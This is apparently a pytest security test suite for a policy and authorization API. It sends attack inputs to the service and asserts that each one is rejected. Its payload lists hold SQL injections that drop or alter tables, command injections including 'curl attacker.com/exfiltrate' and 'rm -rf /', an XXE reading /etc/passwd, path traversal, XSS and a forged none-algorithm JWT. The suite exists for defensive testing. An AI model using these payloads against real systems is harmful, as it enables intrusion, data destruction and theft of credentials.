"""
Advanced Security-Focused QA Test Suite for Policy System
=======================================================

This test suite focuses on real-world attack vectors and breach scenarios
targeting the policy system. It includes comprehensive tests for:
- Policy injection and privilege escalation
- Rate limiting bypass and DoS attacks
- Concurrent policy manipulation exploits
- Audit log tampering and forensic evasion
- Distributed policy synchronization attacks
- Authentication bypass and token manipulation
- Malicious input fuzzing
- Business logic bypass and workflow manipulation
- Infrastructure-level attacks

Author: Senior Python QA Security Engineer
Target: Cedrina Policy System (port 8000)
"""

import asyncio
import json
import time
import uuid
from contextlib import asynccontextmanager
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from unittest.mock import MagicMock, patch

import httpx
import pytest
from hypothesis import given, strategies as st
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession

from src.core.config import get_settings
from src.domain.entities.role import Role
from src.domain.entities.user import User
from src.domain.services.security.policy import PolicyService
from src.infrastructure.database.session import get_db_session
from src.permissions.enforcer import get_enforcer


class AdvancedPolicySecurityTests:
    """Advanced security tests targeting real-world attack scenarios."""
    
    @pytest.fixture(scope="class")
    def settings(self):
        """Get application settings."""
        return get_settings()
    
    @pytest.fixture(scope="class")
    async def async_client(self):
        """Create async HTTP client for testing."""
        async with httpx.AsyncClient(
            base_url="http://localhost:8000",
            timeout=30.0,
            follow_redirects=True
        ) as client:
            yield client
    
    @pytest.fixture(scope="class")
    async def admin_token(self, async_client: httpx.AsyncClient) -> str:
        """Generate admin JWT token for testing."""
        unique_id = uuid.uuid4().hex[:8]
        admin_data = {
            "username": f"admin_security_{unique_id}",
            "email": f"admin_security_{unique_id}@cedrina.test",
            "password": "AdminSecure123!@#",
            "role": "admin"
        }
        
        # Register admin user
        response = await async_client.post("/api/v1/auth/register", json=admin_data)
        assert response.status_code == 201, f"Admin registration failed: {response.text}"
        
        # Login to get token
        login_response = await async_client.post("/api/v1/auth/login", json={
            "username": admin_data["username"],
            "password": admin_data["password"]
        })
        assert login_response.status_code == 200, f"Admin login failed: {login_response.text}"
        
        return login_response.json()["tokens"]["access_token"]
    
    @pytest.fixture(scope="class")
    async def regular_user_token(self, async_client: httpx.AsyncClient) -> str:
        """Generate regular user JWT token for testing."""
        unique_id = uuid.uuid4().hex[:8]
        user_data = {
            "username": f"user_security_{unique_id}",
            "email": f"user_security_{unique_id}@cedrina.test",
            "password": "UserSecure123!@#",
            "role": "user"
        }
        
        # Register regular user
        response = await async_client.post("/api/v1/auth/register", json=user_data)
        assert response.status_code == 201, f"User registration failed: {response.text}"
        
        # Login to get token
        login_response = await async_client.post("/api/v1/auth/login", json={
            "username": user_data["username"],
            "password": user_data["password"]
        })
        assert login_response.status_code == 200, f"User login failed: {login_response.text}"
        
        return login_response.json()["tokens"]["access_token"]
    
    @pytest.fixture
    async def db_session(self) -> AsyncSession:
        """Get database session for direct manipulation."""
        async with get_db_session() as session:
            yield session

    # =================================================================
    # CATEGORY 1: POLICY INJECTION AND PRIVILEGE ESCALATION ATTACKS
    # =================================================================

    @pytest.mark.asyncio
    async def test_policy_injection_via_subject_field(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test policy injection through subject field manipulation."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Attempt to inject malicious policy via subject field
        malicious_payloads = [
            # SQL injection attempts
            {"subject": "admin'; DROP TABLE casbin_rule; --", "object": "/test", "action": "GET"},
            {"subject": "admin' OR '1'='1", "object": "/test", "action": "GET"},
            {"subject": "admin'; INSERT INTO casbin_rule (ptype, v0, v1, v2) VALUES ('p', 'attacker', '/admin/*', '*'); --", "object": "/test", "action": "GET"},
            
            # Command injection attempts
            {"subject": "admin; $(rm -rf /)", "object": "/test", "action": "GET"},
            {"subject": "admin && curl attacker.com/exfiltrate", "object": "/test", "action": "GET"},
            
            # Policy rule injection
            {"subject": "admin\np,attacker,/admin/*,*", "object": "/test", "action": "GET"},
            {"subject": "admin\ng,attacker,admin", "object": "/test", "action": "GET"},
            
            # Unicode and encoding attacks
            {"subject": "admin\u0000attacker", "object": "/test", "action": "GET"},
            {"subject": "admin%00attacker", "object": "/test", "action": "GET"},
            {"subject": "admin\x00attacker", "object": "/test", "action": "GET"},
        ]
        
        for payload in malicious_payloads:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=payload
            )
            
            # Should reject all malicious inputs
            assert response.status_code == 422, f"Policy injection not prevented: {payload['subject']}"
            
            # Verify no malicious policy was added
            policies_response = await async_client.get("/api/v1/admin/policies", headers=headers)
            assert policies_response.status_code == 200
            policies = policies_response.json()["policies"]
            
            # Check that no policy contains injection attempts
            for policy in policies:
                assert "DROP TABLE" not in policy["subject"], "SQL injection succeeded"
                assert "INSERT INTO" not in policy["subject"], "SQL injection succeeded"
                assert "rm -rf" not in policy["subject"], "Command injection succeeded"
                assert "attacker" not in policy["subject"], "Policy injection succeeded"

    @pytest.mark.asyncio
    async def test_privilege_escalation_via_role_manipulation(
        self, 
        async_client: httpx.AsyncClient, 
        regular_user_token: str,
        admin_token: str
    ):
        """Test privilege escalation through role manipulation."""
        regular_headers = {"Authorization": f"Bearer {regular_user_token}"}
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        
        # 1. Verify regular user cannot access admin endpoints
        response = await async_client.get("/api/v1/admin/policies", headers=regular_headers)
        assert response.status_code == 403, "Regular user should not access admin endpoints"
        
        # 2. Attempt to add policy granting admin privileges to regular user
        escalation_policy = {
            "subject": "user",
            "object": "/admin/*",
            "action": "*"
        }
        
        # Should fail - regular user cannot add policies
        response = await async_client.post(
            "/api/v1/admin/policies/add",
            headers=regular_headers,
            json=escalation_policy
        )
        assert response.status_code == 403, "Regular user should not add policies"
        
        # 3. Even if admin adds the policy, verify role-based access is still enforced
        response = await async_client.post(
            "/api/v1/admin/policies/add",
            headers=admin_headers,
            json=escalation_policy
        )
        assert response.status_code == 201, "Admin should be able to add policy"
        
        # 4. Verify regular user still cannot access admin endpoints (role-based enforcement)
        response = await async_client.get("/api/v1/admin/policies", headers=regular_headers)
        assert response.status_code == 403, "Role-based access should still be enforced"

    @pytest.mark.asyncio
    async def test_wildcard_policy_exploitation(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test exploitation of wildcard policies for privilege escalation."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Attempt to create overly permissive wildcard policies
        dangerous_policies = [
            {"subject": "*", "object": "/admin/*", "action": "*"},
            {"subject": "*", "object": "*", "action": "*"},
            {"subject": "user", "object": "*", "action": "*"},
        ]
        
        for policy in dangerous_policies:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=policy
            )
            
            # System should prevent overly permissive policies
            if policy["subject"] == "*" and policy["object"] == "*":
                assert response.status_code == 422, f"Overly permissive policy should be rejected: {policy}"
            else:
                # Even if allowed, verify they don't bypass role-based access
                assert response.status_code in [201, 422], f"Unexpected response for policy: {policy}"

    # =================================================================
    # CATEGORY 2: RATE LIMITING BYPASS AND DOS ATTACKS
    # =================================================================

    @pytest.mark.asyncio
    async def test_rate_limiting_bypass_attempts(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test various rate limiting bypass techniques."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Basic rate limit test - should hit limit at 50 requests/minute
        policy = {"subject": "test_user", "object": "/test", "action": "GET"}
        
        # 1. Test rapid-fire requests
        rapid_fire_tasks = []
        for i in range(60):  # Exceed rate limit
            task = async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json={**policy, "subject": f"test_user_{i}"}
            )
            rapid_fire_tasks.append(task)
        
        responses = await asyncio.gather(*rapid_fire_tasks, return_exceptions=True)
        
        # Should hit rate limit
        rate_limited_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 429)
        assert rate_limited_count > 0, "Rate limiting should be enforced"
        
        # 2. Test header manipulation bypass attempts
        bypass_headers = [
            {**headers, "X-Forwarded-For": "1.2.3.4"},
            {**headers, "X-Real-IP": "5.6.7.8"},
            {**headers, "X-Originating-IP": "9.10.11.12"},
            {**headers, "X-Client-IP": "13.14.15.16"},
            {**headers, "X-Cluster-Client-IP": "17.18.19.20"},
        ]
        
        for bypass_header in bypass_headers:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=bypass_header,
                json=policy
            )
            # Should still be rate limited
            assert response.status_code == 429, f"Rate limit bypass via headers: {bypass_header}"

    @pytest.mark.asyncio
    async def test_distributed_denial_of_service_simulation(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Simulate distributed DoS attacks on policy endpoints."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Simulate attacks from multiple "sources" (different request patterns)
        attack_patterns = [
            # Pattern 1: Policy flooding
            {"endpoint": "/api/v1/admin/policies/add", "method": "POST", "data": {"subject": "flood_user", "object": "/test", "action": "GET"}},
            # Pattern 2: Policy listing spam
            {"endpoint": "/api/v1/admin/policies", "method": "GET", "data": None},
            # Pattern 3: Policy removal spam
            {"endpoint": "/api/v1/admin/policies/remove", "method": "POST", "data": {"subject": "nonexistent", "object": "/test", "action": "GET"}},
        ]
        
        # Launch concurrent attacks
        attack_tasks = []
        for pattern in attack_patterns:
            for _ in range(20):  # 20 requests per pattern
                if pattern["method"] == "GET":
                    task = async_client.get(pattern["endpoint"], headers=headers)
                else:
                    task = async_client.post(pattern["endpoint"], headers=headers, json=pattern["data"])
                attack_tasks.append(task)
        
        start_time = time.time()
        responses = await asyncio.gather(*attack_tasks, return_exceptions=True)
        end_time = time.time()
        
        # Analyze attack results
        success_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 200)
        rate_limited_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 429)
        error_count = sum(1 for r in responses if isinstance(r, Exception))
        
        # System should handle DoS gracefully
        assert rate_limited_count > 0, "Rate limiting should activate under DoS"
        assert error_count < len(attack_tasks) * 0.1, "System should not crash under DoS"
        assert end_time - start_time < 60, "System should respond within reasonable time"

    # =================================================================
    # CATEGORY 3: CONCURRENT POLICY MANIPULATION EXPLOITS
    # =================================================================

    @pytest.mark.asyncio
    async def test_race_condition_policy_creation(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test race conditions in concurrent policy creation."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Create identical policies concurrently to test race conditions
        policy = {
            "subject": "race_test_user",
            "object": "/race_test",
            "action": "GET"
        }
        
        # Launch 50 concurrent requests for the same policy
        concurrent_tasks = []
        for _ in range(50):
            task = async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=policy
            )
            concurrent_tasks.append(task)
        
        responses = await asyncio.gather(*concurrent_tasks, return_exceptions=True)
        
        # Analyze results
        success_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 201)
        duplicate_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 409)
        
        # Should handle duplicates gracefully
        assert success_count <= 1, "Only one policy should be created"
        assert duplicate_count >= 45, "Duplicate policies should be detected"
        
        # Verify only one policy exists
        policies_response = await async_client.get("/api/v1/admin/policies", headers=headers)
        assert policies_response.status_code == 200
        policies = policies_response.json()["policies"]
        
        matching_policies = [p for p in policies if p["subject"] == "race_test_user"]
        assert len(matching_policies) <= 1, "Race condition created duplicate policies"

    @pytest.mark.asyncio
    async def test_concurrent_policy_modification_integrity(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test data integrity during concurrent policy modifications."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Create base policies
        base_policies = [
            {"subject": f"concurrent_user_{i}", "object": "/test", "action": "GET"}
            for i in range(10)
        ]
        
        for policy in base_policies:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=policy
            )
            assert response.status_code == 201, f"Failed to create base policy: {policy}"
        
        # Perform concurrent modifications
        modification_tasks = []
        
        # Add new policies
        for i in range(10, 20):
            task = async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json={"subject": f"concurrent_user_{i}", "object": "/test", "action": "GET"}
            )
            modification_tasks.append(task)
        
        # Remove existing policies
        for i in range(5):
            task = async_client.post(
                "/api/v1/admin/policies/remove",
                headers=headers,
                json={"subject": f"concurrent_user_{i}", "object": "/test", "action": "GET"}
            )
            modification_tasks.append(task)
        
        # Execute all modifications concurrently
        responses = await asyncio.gather(*modification_tasks, return_exceptions=True)
        
        # Verify data integrity
        policies_response = await async_client.get("/api/v1/admin/policies", headers=headers)
        assert policies_response.status_code == 200
        policies = policies_response.json()["policies"]
        
        # Should have consistent state
        concurrent_policies = [p for p in policies if p["subject"].startswith("concurrent_user_")]
        assert len(concurrent_policies) >= 10, "Concurrent modifications corrupted policy state"

    # =================================================================
    # CATEGORY 4: AUDIT LOG TAMPERING AND FORENSIC EVASION
    # =================================================================

    @pytest.mark.asyncio
    async def test_audit_log_tampering_attempts(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str,
        db_session: AsyncSession
    ):
        """Test attempts to tamper with audit logs."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Create a policy to generate audit log entry
        policy = {
            "subject": "audit_test_user",
            "object": "/audit_test",
            "action": "GET"
        }
        
        response = await async_client.post(
            "/api/v1/admin/policies/add",
            headers=headers,
            json=policy
        )
        assert response.status_code == 201, "Policy creation failed"
        
        # Attempt to tamper with audit logs via SQL injection
        tamper_attempts = [
            # Direct SQL injection in policy fields
            {"subject": "'; DELETE FROM policy_audit_logs; --", "object": "/test", "action": "GET"},
            # Attempt to modify audit log entries
            {"subject": "'; UPDATE policy_audit_logs SET performed_by = 'attacker'; --", "object": "/test", "action": "GET"},
            # Attempt to insert fake audit entries
            {"subject": "'; INSERT INTO policy_audit_logs (operation, performed_by) VALUES ('fake', 'attacker'); --", "object": "/test", "action": "GET"},
        ]
        
        for tamper_attempt in tamper_attempts:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=tamper_attempt
            )
            assert response.status_code == 422, f"Audit log tampering not prevented: {tamper_attempt}"
        
        # Verify audit log integrity
        audit_query = text("SELECT COUNT(*) FROM policy_audit_logs WHERE operation = 'ADD_POLICY'")
        result = await db_session.execute(audit_query)
        audit_count = result.scalar()
        
        assert audit_count >= 1, "Audit log entries should exist"
        
        # Verify no tampering occurred
        tamper_check = text("SELECT COUNT(*) FROM policy_audit_logs WHERE performed_by = 'attacker'")
        result = await db_session.execute(tamper_check)
        tamper_count = result.scalar()
        
        assert tamper_count == 0, "Audit log tampering detected"

    @pytest.mark.asyncio
    async def test_forensic_evasion_techniques(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test various forensic evasion techniques."""
        
        # Test with forged/modified headers to evade tracking
        evasion_headers = [
            {"Authorization": f"Bearer {admin_token}", "User-Agent": ""},
            {"Authorization": f"Bearer {admin_token}", "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
            {"Authorization": f"Bearer {admin_token}", "X-Forwarded-For": "127.0.0.1"},
            {"Authorization": f"Bearer {admin_token}", "X-Real-IP": "::1"},
        ]
        
        policy = {
            "subject": "evasion_test_user",
            "object": "/evasion_test",
            "action": "GET"
        }
        
        for headers in evasion_headers:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json={**policy, "subject": f"{policy['subject']}_{len(headers)}"}
            )
            
            # Should still be tracked and audited
            assert response.status_code in [201, 422], f"Unexpected response with evasion headers: {headers}"

    # =================================================================
    # CATEGORY 5: DISTRIBUTED POLICY SYNCHRONIZATION ATTACKS
    # =================================================================

    @pytest.mark.asyncio
    async def test_policy_synchronization_interference(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test interference with distributed policy synchronization."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Create policies rapidly to test synchronization under load
        sync_test_policies = [
            {"subject": f"sync_user_{i}", "object": "/sync_test", "action": "GET"}
            for i in range(100)
        ]
        
        # Create policies in rapid succession
        sync_tasks = []
        for policy in sync_test_policies:
            task = async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=policy
            )
            sync_tasks.append(task)
        
        responses = await asyncio.gather(*sync_tasks, return_exceptions=True)
        
        # Verify synchronization integrity
        success_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 201)
        
        # Wait for synchronization to complete
        await asyncio.sleep(2)
        
        # Verify all policies are accessible
        policies_response = await async_client.get("/api/v1/admin/policies", headers=headers)
        assert policies_response.status_code == 200
        policies = policies_response.json()["policies"]
        
        sync_policies = [p for p in policies if p["subject"].startswith("sync_user_")]
        assert len(sync_policies) >= success_count * 0.9, "Policy synchronization lost data"

    @pytest.mark.asyncio
    async def test_redis_poisoning_simulation(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Simulate Redis poisoning attacks on policy synchronization."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Test with malicious policy data that could poison Redis
        poison_policies = [
            {"subject": "poison_test", "object": "/test", "action": "GET"},
            {"subject": "poison_test" + "A" * 1000, "object": "/test", "action": "GET"},  # Large payload
            {"subject": "poison_test\n\rMALICIOUS", "object": "/test", "action": "GET"},  # Control characters
        ]
        
        for policy in poison_policies:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=policy
            )
            
            # Should handle malicious payloads gracefully
            if len(policy["subject"]) > 255:
                assert response.status_code == 422, f"Large payload not rejected: {policy}"
            elif "\n" in policy["subject"] or "\r" in policy["subject"]:
                assert response.status_code == 422, f"Control characters not rejected: {policy}"
            else:
                assert response.status_code == 201, f"Valid policy rejected: {policy}"

    # =================================================================
    # CATEGORY 6: AUTHENTICATION BYPASS AND TOKEN MANIPULATION
    # =================================================================

    @pytest.mark.asyncio
    async def test_jwt_token_manipulation_attacks(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test JWT token manipulation and forgery attacks."""
        
        # Test with manipulated JWT tokens
        manipulated_tokens = [
            # None algorithm attack
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
            # Modified signature
            admin_token[:-10] + "manipulated",
            # Expired token simulation
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MX0.invalid",
            # Malformed tokens
            "invalid.token.here",
            "Bearer " + admin_token,  # Double Bearer
            admin_token.replace(".", ""),  # Malformed structure
        ]
        
        policy = {"subject": "token_test_user", "object": "/test", "action": "GET"}
        
        for token in manipulated_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=policy
            )
            
            # Should reject all manipulated tokens
            assert response.status_code == 401, f"Token manipulation not detected: {token[:50]}..."

    @pytest.mark.asyncio
    async def test_session_fixation_and_hijacking(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test session fixation and hijacking attacks."""
        
        # Test with various session manipulation techniques
        session_attacks = [
            # Missing Authorization header
            {},
            # Empty Authorization header
            {"Authorization": ""},
            # Invalid Authorization scheme
            {"Authorization": "Basic " + admin_token},
            {"Authorization": "Digest " + admin_token},
            # Case manipulation
            {"authorization": f"Bearer {admin_token}"},
            {"Authorization": f"bearer {admin_token}"},
        ]
        
        policy = {"subject": "session_test_user", "object": "/test", "action": "GET"}
        
        for headers in session_attacks:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=policy
            )
            
            # Should reject invalid sessions
            assert response.status_code == 401, f"Session attack not detected: {headers}"

    # =================================================================
    # CATEGORY 7: COMPREHENSIVE MALICIOUS INPUT FUZZING
    # =================================================================

    @given(st.text(min_size=1, max_size=1000))
    @pytest.mark.asyncio
    async def test_fuzz_policy_subject_field(
        self, 
        subject_input: str,
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Fuzz test the policy subject field with random inputs."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        policy = {
            "subject": subject_input,
            "object": "/fuzz_test",
            "action": "GET"
        }
        
        response = await async_client.post(
            "/api/v1/admin/policies/add",
            headers=headers,
            json=policy
        )
        
        # Should handle all inputs gracefully
        assert response.status_code in [201, 422], f"Unexpected response for input: {subject_input[:50]}..."
        
        # If accepted, verify it was stored correctly
        if response.status_code == 201:
            policies_response = await async_client.get("/api/v1/admin/policies", headers=headers)
            assert policies_response.status_code == 200
            policies = policies_response.json()["policies"]
            
            # Verify the policy was stored without corruption
            matching_policy = next((p for p in policies if p["subject"] == subject_input), None)
            assert matching_policy is not None, "Policy not found after creation"

    @pytest.mark.asyncio
    async def test_malicious_payload_injection(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test injection of various malicious payloads."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Comprehensive malicious payload collection
        malicious_payloads = [
            # XSS payloads
            {"subject": "<script>alert('XSS')</script>", "object": "/test", "action": "GET"},
            {"subject": "javascript:alert('XSS')", "object": "/test", "action": "GET"},
            {"subject": "onload=alert('XSS')", "object": "/test", "action": "GET"},
            
            # SQL injection payloads
            {"subject": "'; DROP TABLE users; --", "object": "/test", "action": "GET"},
            {"subject": "' OR 1=1; --", "object": "/test", "action": "GET"},
            {"subject": "' UNION SELECT * FROM casbin_rule; --", "object": "/test", "action": "GET"},
            
            # NoSQL injection payloads
            {"subject": "'; return true; var x='", "object": "/test", "action": "GET"},
            {"subject": "$ne", "object": "/test", "action": "GET"},
            
            # Command injection payloads
            {"subject": "; cat /etc/passwd", "object": "/test", "action": "GET"},
            {"subject": "$(whoami)", "object": "/test", "action": "GET"},
            {"subject": "`id`", "object": "/test", "action": "GET"},
            
            # Path traversal payloads
            {"subject": "../../../etc/passwd", "object": "/test", "action": "GET"},
            {"subject": "..\\..\\..\\windows\\system32\\config\\sam", "object": "/test", "action": "GET"},
            
            # LDAP injection payloads
            {"subject": "*()(uid=*)", "object": "/test", "action": "GET"},
            {"subject": "admin)(|(password=*))", "object": "/test", "action": "GET"},
            
            # XML injection payloads
            {"subject": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "object": "/test", "action": "GET"},
            
            # Buffer overflow simulation
            {"subject": "A" * 10000, "object": "/test", "action": "GET"},
            
            # Unicode/encoding attacks
            {"subject": "admin\u0000", "object": "/test", "action": "GET"},
            {"subject": "admin%00", "object": "/test", "action": "GET"},
            {"subject": "admin\x00", "object": "/test", "action": "GET"},
            
            # Format string attacks
            {"subject": "%s%s%s%s", "object": "/test", "action": "GET"},
            {"subject": "%x%x%x%x", "object": "/test", "action": "GET"},
        ]
        
        for payload in malicious_payloads:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=payload
            )
            
            # Should reject all malicious payloads
            assert response.status_code == 422, f"Malicious payload not rejected: {payload['subject'][:50]}..."
            
            # Verify response doesn't contain sensitive information
            response_text = response.text.lower()
            assert "password" not in response_text, "Sensitive information leaked in error response"
            assert "database" not in response_text, "Database information leaked in error response"
            assert "internal" not in response_text, "Internal information leaked in error response"

    # =================================================================
    # CATEGORY 8: BUSINESS LOGIC BYPASS AND WORKFLOW MANIPULATION
    # =================================================================

    @pytest.mark.asyncio
    async def test_business_logic_bypass_attempts(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test attempts to bypass business logic constraints."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Test business logic violations
        logic_violations = [
            # Duplicate policy creation
            {"subject": "logic_test", "object": "/test", "action": "GET"},
            {"subject": "logic_test", "object": "/test", "action": "GET"},  # Duplicate
            
            # Invalid combinations
            {"subject": "", "object": "/test", "action": "GET"},  # Empty subject
            {"subject": "test", "object": "", "action": "GET"},  # Empty object
            {"subject": "test", "object": "/test", "action": ""},  # Empty action
            
            # Logical inconsistencies
            {"subject": "admin", "object": "/user/*", "action": "DENY"},  # Contradictory policy
        ]
        
        for i, violation in enumerate(logic_violations):
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=violation
            )
            
            if i == 0:
                assert response.status_code == 201, "First policy should succeed"
            elif i == 1:
                assert response.status_code == 409, "Duplicate policy should be rejected"
            else:
                assert response.status_code == 422, f"Invalid policy should be rejected: {violation}"

    @pytest.mark.asyncio
    async def test_workflow_manipulation_attacks(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test manipulation of policy management workflows."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Test workflow manipulation
        # 1. Create policy
        policy = {"subject": "workflow_test", "object": "/test", "action": "GET"}
        response = await async_client.post(
            "/api/v1/admin/policies/add",
            headers=headers,
            json=policy
        )
        assert response.status_code == 201, "Policy creation failed"
        
        # 2. Attempt to remove non-existent policy
        fake_policy = {"subject": "nonexistent", "object": "/test", "action": "GET"}
        response = await async_client.post(
            "/api/v1/admin/policies/remove",
            headers=headers,
            json=fake_policy
        )
        assert response.status_code == 404, "Non-existent policy removal should fail"
        
        # 3. Attempt to remove policy with partial match
        partial_policy = {"subject": "workflow_test", "object": "/different", "action": "GET"}
        response = await async_client.post(
            "/api/v1/admin/policies/remove",
            headers=headers,
            json=partial_policy
        )
        assert response.status_code == 404, "Partial match removal should fail"
        
        # 4. Proper policy removal
        response = await async_client.post(
            "/api/v1/admin/policies/remove",
            headers=headers,
            json=policy
        )
        assert response.status_code == 200, "Proper policy removal should succeed"

    # =================================================================
    # CATEGORY 9: INFRASTRUCTURE-LEVEL ATTACKS
    # =================================================================

    @pytest.mark.asyncio
    async def test_database_connection_exhaustion(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test database connection exhaustion attacks."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Launch many concurrent long-running requests
        connection_tasks = []
        for i in range(100):  # High number of concurrent connections
            task = async_client.get(
                "/api/v1/admin/policies",
                headers=headers,
                timeout=30.0
            )
            connection_tasks.append(task)
        
        start_time = time.time()
        responses = await asyncio.gather(*connection_tasks, return_exceptions=True)
        end_time = time.time()
        
        # Analyze results
        success_count = sum(1 for r in responses if hasattr(r, 'status_code') and r.status_code == 200)
        error_count = sum(1 for r in responses if isinstance(r, Exception))
        
        # System should handle connection pressure gracefully
        assert success_count > 0, "System should handle some requests under pressure"
        assert error_count < len(connection_tasks) * 0.5, "System should not fail completely"
        assert end_time - start_time < 60, "System should respond within reasonable time"

    @pytest.mark.asyncio
    async def test_memory_exhaustion_attacks(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test memory exhaustion through large payload attacks."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Test with increasingly large payloads
        large_payloads = [
            {"subject": "A" * 1000, "object": "/test", "action": "GET"},
            {"subject": "B" * 5000, "object": "/test", "action": "GET"},
            {"subject": "C" * 10000, "object": "/test", "action": "GET"},
            {"subject": "D" * 50000, "object": "/test", "action": "GET"},
        ]
        
        for payload in large_payloads:
            response = await async_client.post(
                "/api/v1/admin/policies/add",
                headers=headers,
                json=payload
            )
            
            # Should reject large payloads
            assert response.status_code == 422, f"Large payload not rejected: {len(payload['subject'])} chars"
            
            # Verify no memory leak indicators
            assert "memory" not in response.text.lower(), "Memory error exposed in response"

    @pytest.mark.asyncio
    async def test_network_layer_attacks(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str
    ):
        """Test network layer attacks and malformed requests."""
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Test with malformed HTTP requests
        malformed_requests = [
            # Invalid JSON
            '{"subject": "test", "object": "/test", "action": "GET"',  # Missing closing brace
            '{"subject": "test", "object": "/test", "action": "GET", }',  # Trailing comma
            '{"subject": "test", "object": "/test", "action": "GET", "extra": }',  # Invalid value
            
            # Invalid content types
            "subject=test&object=/test&action=GET",  # Form data instead of JSON
            
            # Binary data
            b'\x00\x01\x02\x03\x04\x05',
        ]
        
        for malformed_data in malformed_requests:
            try:
                if isinstance(malformed_data, str):
                    response = await async_client.post(
                        "/api/v1/admin/policies/add",
                        headers=headers,
                        content=malformed_data,
                        timeout=10.0
                    )
                else:
                    response = await async_client.post(
                        "/api/v1/admin/policies/add",
                        headers=headers,
                        content=malformed_data,
                        timeout=10.0
                    )
                
                # Should handle malformed requests gracefully
                assert response.status_code in [400, 422], f"Malformed request not handled: {malformed_data[:50]}..."
                
            except Exception as e:
                # Network errors are acceptable for malformed requests
                assert "timeout" in str(e).lower() or "connection" in str(e).lower(), f"Unexpected error: {e}"

    # =================================================================
    # COMPREHENSIVE SECURITY VALIDATION REPORT
    # =================================================================

    @pytest.mark.asyncio
    async def test_comprehensive_security_validation(
        self, 
        async_client: httpx.AsyncClient, 
        admin_token: str,
        regular_user_token: str
    ):
        """Comprehensive security validation test combining multiple attack vectors."""
        
        # Test report structure
        security_report = {
            "policy_injection": {"tested": 0, "blocked": 0, "bypassed": 0},
            "privilege_escalation": {"tested": 0, "blocked": 0, "bypassed": 0},
            "rate_limiting": {"tested": 0, "blocked": 0, "bypassed": 0},
            "authentication": {"tested": 0, "blocked": 0, "bypassed": 0},
            "input_validation": {"tested": 0, "blocked": 0, "bypassed": 0},
            "audit_integrity": {"tested": 0, "blocked": 0, "bypassed": 0},
        }
        
        # Multi-vector attack simulation
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        user_headers = {"Authorization": f"Bearer {regular_user_token}"}
        
        # 1. Policy injection + privilege escalation
        combined_attack = {
